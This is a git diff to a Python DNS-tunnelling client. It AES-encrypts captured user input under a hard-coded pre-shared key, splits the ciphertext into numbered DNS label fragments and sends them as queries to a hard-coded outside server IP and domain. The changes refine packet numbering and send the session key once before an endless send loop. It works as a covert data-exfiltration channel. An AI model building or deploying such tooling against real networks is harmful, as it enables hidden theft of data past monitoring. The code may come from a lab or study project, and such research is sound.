@@ -16,6 +16,10 @@ DNS_SERVER_IP = '13.228.229.230'  # Replace with your DNS server IP
 DNS_PORT = 53
 DOMAIN = 'sub.brightbuys.me'  # Replace with your target domain
 
+key_sent = False
+# First packet is always 1, k will mean it is a AES key    
+packet_number = 0  
+
 # Pre-shared key (PSK) for exchanging the AES key securely
 psk = b"thisisaverysecurekey123456789012"  # Must be 16, 24, or 32 bytes long
 
@@ -46,11 +50,13 @@ def capture_user_input(duration=10):
 
     print("\nInput capturing complete.")
 
+
 # Encrypt AES key using PSK
 def encrypt_with_psk(aes_key, psk, iv):
     cipher = AES.new(psk, AES.MODE_CBC, iv)
     encrypted_aes_key = cipher.encrypt(pad(aes_key, AES.block_size))
     return base64.b64encode(iv + encrypted_aes_key).decode('utf-8')
+
 
 # AES encryption
 def encrypt_aes(data, key, iv):
@@ -60,6 +66,7 @@ def encrypt_aes(data, key, iv):
     print(f"[CLIENT] Original message: {data}")
     print(f"[CLIENT] Encrypted message (base64): {encrypted_message}")
     return encrypted_message
+
 
 # AES decryption
 def decrypt_aes(data, key):
@@ -76,35 +83,57 @@ def decrypt_aes(data, key):
         print(f"[CLIENT] Decryption error: {e}")
         return None
 
+# TODO: CAN DO DIRECTLY IN THE CRAFT DNS QUERY :(
+def append_message(message):
+    global key_sent
+    global packet_number
+    
+    # Craft message with packet number, "k" for first key fragment and no packet number for keys
+    if key_sent is False:
+        message = f"k:{message}"
+        key_sent = True
+        
+    elif packet_number == 0:
+        message = f"k2:{message}"
+        packet_number += 1
+
+    else:
+        message = f"{packet_number}:{message}"
+        packet_number += 1
+        #TODO: ADD PACKET REFRESH
+        if packet_number > 999:
+            packet_number = 1
+        
+    return message    
+
 # Fragment message to fit within DNS label size limits
-def fragment_message(message, max_label_length=63):
+# 59 for now, -4 for the front IDs
+def fragment_message(message, max_label_length=59):
+    # Ensure the message is properly padded for base64
     missing_padding = len(message) % 4
     if missing_padding:
-        message += '=' * (4 - missing_padding)
+        message += '=' * (4 - missing_padding)  # Add padding if necessary
+
     fragments = []
     while message:
-        fragments.append(message[:max_label_length])
+         # Take the first `max_label_length` part of the message
+        fragment = message[:max_label_length]
+        
+        # Append packet number at the beginning of the fragment
+        fragment_with_number = append_message(fragment)
+        fragments.append(fragment_with_number)
         message = message[max_label_length:]
+
+    # Logging each fragment
+    print(f"[CLIENT] Total fragments created: {len(fragments)}")
+    for i, fragment in enumerate(fragments):
+        print(f"[CLIENT] Fragment {i + 1}: {fragment}")
+
     return fragments
 
-# Craft DNS query based on the query type (TXT, CNAME, or A)
-def craft_dns_query(fragment, domain, query_type='TXT'):
-    if not fragment:
-        print("Error: Empty fragment, skipping query")
-        return None
-    full_query_name = f"{fragment}.{domain}."
-    print(f"Sending DNS Query: {full_query_name}")
-    qtype_mapping = {'TXT': 16, 'CNAME': 5, 'A': 1}
-    qtype_value = qtype_mapping.get(query_type, 16)
-    dns_query = (
-        IP(dst=DNS_SERVER_IP) /
-        UDP(sport=RandShort(), dport=53) /
-        DNS(rd=1, qd=DNSQR(qname=full_query_name, qtype=qtype_value))
-    )
-    return dns_query
 
 # Send DNS query based on the query type
-def send_dns_query(server_ip, query_pkt, timeout=10):
+def send_dns_query(query_pkt, timeout=5):  # Increase timeout to 10 seconds
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(timeout)
@@ -113,17 +142,65 @@ def send_dns_query(server_ip, query_pkt, timeout=10):
         print(f"[CLIENT] Received response: {response}")
         return response
     except socket.timeout:
-        print("[CLIENT] DNS query timeout.")
+        pass
     finally:
         sock.close()
 
-# Main function with a continuous loop
+
+# AES decryption for the encrypted AES key
+def decrypt_with_psk(encrypted_data, psk):
+    try:
+        print(f"[CLIENT] Encrypted data (base64) for AES key decryption: {encrypted_data}")
+        data = base64.b64decode(encrypted_data)
+        iv = data[:16]  # Extract the IV (first 16 bytes)
+        encrypted_aes_key = data[16:]  # The rest is the encrypted AES key
+        cipher = AES.new(psk, AES.MODE_CBC, iv)
+        decrypted_aes_key = unpad(cipher.decrypt(encrypted_aes_key), AES.block_size)
+        print(f"[CLIENT] Decrypted AES Key: {decrypted_aes_key}")
+        return decrypted_aes_key
+    except Exception as e:
+        print(f"[CLIENT] AES key decryption error: {e}")
+        return None
+
+
+# Craft DNS query based on the query type (TXT, CNAME, or A)
+def craft_dns_query(fragment, domain, query_type='TXT'):
+    if not fragment:
+        print("Error: Empty fragment, skipping query")
+        return None
+    
+    full_query_name = f"{fragment}.{domain}."
+    print(f"Sending DNS Query: {full_query_name}")
+    qtype_mapping = {'TXT': 16, 'CNAME': 5, 'A': 1}
+    qtype_value = qtype_mapping.get(query_type, 16)
+    dns_query = (
+            IP(dst=DNS_SERVER_IP) /
+            UDP(sport=RandShort(), dport=53) /
+            DNS(rd=1, qd=DNSQR(qname=full_query_name, qtype=qtype_value))
+    ) 
+    return dns_query
+
+
 if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 client.py <query_type>")
         sys.exit(1)
 
     query_type = sys.argv[1].upper()
+    
+    # Step 2: Generate AES key and IV for the session
+    aes_key = get_random_bytes(32)  # 32 bytes for AES-256
+    aes_iv = get_random_bytes(16)
+
+    # Step 3: Encrypt the AES key using the PSK
+    encrypted_aes_key = encrypt_with_psk(aes_key, psk, aes_iv)
+    encrypted_aes_key_fragments = fragment_message(encrypted_aes_key)
+
+    # Step 4: Send the encrypted AES key as DNS queries
+    for fragment in encrypted_aes_key_fragments:
+        query_pkt = craft_dns_query(fragment, DOMAIN, 'TXT')
+        print(f"[CLIENT] Sending AES key fragment: {fragment}")
+        send_dns_query(query_pkt)
 
     # Run the input capture and message sending in a continuous loop
     while True:
@@ -138,20 +215,6 @@ if __name__ == "__main__":
 
         message_to_send = user_input.strip()
 
-        # Step 2: Generate AES key and IV for the session
-        aes_key = get_random_bytes(32)  # 32 bytes for AES-256
-        aes_iv = get_random_bytes(16)
-
-        # Step 3: Encrypt the AES key using the PSK
-        encrypted_aes_key = encrypt_with_psk(aes_key, psk, aes_iv)
-        encrypted_aes_key_fragments = fragment_message(encrypted_aes_key)
-
-        # Step 4: Send the encrypted AES key as DNS queries
-        for fragment in encrypted_aes_key_fragments:
-            query_pkt = craft_dns_query(fragment, DOMAIN, 'TXT')
-            print(f"[CLIENT] Sending AES key fragment: {fragment}")
-            send_dns_query(DNS_SERVER_IP, query_pkt)
-
         # Step 5: Encrypt the actual message using the AES key
         encrypted_message = encrypt_aes(message_to_send, aes_key, aes_iv)
         fragments = fragment_message(encrypted_message)
@@ -160,6 +223,6 @@ if __name__ == "__main__":
         for fragment in fragments:
             query_pkt = craft_dns_query(fragment, DOMAIN, query_type)
             print(f"[CLIENT] Sending message fragment: {fragment}")
-            send_dns_query(DNS_SERVER_IP, query_pkt)
+            send_dns_query(query_pkt)
 
         print("[CLIENT] All messages sent, waiting for the next input.")
